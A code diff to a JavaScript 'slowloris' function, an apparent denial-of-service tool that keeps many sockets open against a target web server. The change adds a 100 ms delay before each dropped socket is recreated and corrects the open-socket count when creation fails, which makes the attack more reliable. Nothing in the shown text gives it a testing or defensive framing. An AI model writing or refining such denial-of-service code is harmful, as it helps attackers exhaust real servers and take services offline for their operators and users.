@@ -51,7 +51,9 @@ function slowloris(target, numSockets) {
                     openSockets--;
                     cleanupSocket(socket, index);
                     // Recreate the socket to maintain the desired number of sockets
-                    createSocket(hostname, port, index, isSecure, path);
+                    setTimeout(() => {
+                        createSocket(hostname, port, index, isSecure, path);
+                    }, 100); // Add a small delay before recreating the socket
                 });
 
                 socket.on('error', (error) => {
@@ -59,13 +61,18 @@ function slowloris(target, numSockets) {
                     openSockets--;
                     cleanupSocket(socket, index);
                     // Recreate the socket to maintain the desired number of sockets
-                    createSocket(hostname, port, index, isSecure, path);
+                    setTimeout(() => {
+                        createSocket(hostname, port, index, isSecure, path);
+                    }, 100); // Add a small delay before recreating the socket
                 });
             } catch (socketError) {
                 console.error(`Error creating socket ${index + 1}:`, socketError);
+                 openSockets--; // Decrement openSockets on creation failure
                 cleanupSocket(socket, index);
                 // Recreate the socket to maintain the desired number of sockets
-                createSocket(hostname, port, index, isSecure, path);
+                  setTimeout(() => {
+                        createSocket(hostname, port, index, isSecure, path);
+                    }, 100); // Add a small delay before recreating the socket
             }
         }
 
